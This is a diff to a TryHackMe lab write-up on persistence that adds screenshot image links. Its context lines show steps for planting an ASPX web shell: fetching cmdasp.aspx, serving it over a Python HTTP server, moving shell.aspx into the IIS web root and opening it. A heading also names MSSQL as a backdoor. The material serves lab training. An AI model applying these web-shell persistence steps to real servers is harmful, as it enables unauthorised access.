@@ -12,7 +12,7 @@ This writeup was last updated: 07/06/2023
 root@ip-10-10-32-42:~# firefox https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Firefox%20cmdaspx.net%20Github.png)
 
 3. `sudo python -m http.server`
 ```Bash
@@ -64,11 +64,11 @@ PS C:\Users\Administrator>move shell.aspx C:\inetpub\wwwroot\
 PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Open.png)
 
 9. `C:\flags\flag16.exe`
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Flag.png)
 
 # Using MSSQL as a Backdoor
 1. Started this room's machine
